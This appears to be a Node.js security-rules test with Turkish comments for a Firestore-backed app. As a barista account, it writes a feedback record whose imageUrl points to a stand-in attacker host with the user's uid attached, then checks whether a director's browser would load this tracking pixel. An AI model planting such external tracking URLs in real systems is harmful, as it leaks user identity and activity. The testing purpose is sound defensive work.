// İçerik yoluyla iz: barista geri bildirime dış imageUrl koyabiliyor mu (direktöre piksel)
import { readFileSync } from 'node:fs';
import { setLogLevel } from 'firebase/app'; setLogLevel('silent');
import { client, attempt } from './lib.mjs';
import { addDoc, collection } from 'firebase/firestore';
const A = JSON.parse(readFileSync(new URL('./out/hesaplar.json', import.meta.url)));
const b = await client(A.bA.email, A.bA.password);
const r = await attempt(() => addDoc(collection(b.db, 'feedback'), { by: A.bA.uid, status: 'yeni', text: 'merhaba', imageUrl: 'https://saldirgan.example/piksel.png?who=' + A.bA.uid, by2: 'ekstra' }));
console.log('barista feedback + dış imageUrl + fazladan alan:', r.ok ? 'İZİN (alan kısıtı yok; FeedbackPage <img src> ile direktör tarayıcısında yükler)' : 'red ' + r.code);
await b.close(); process.exit(0);
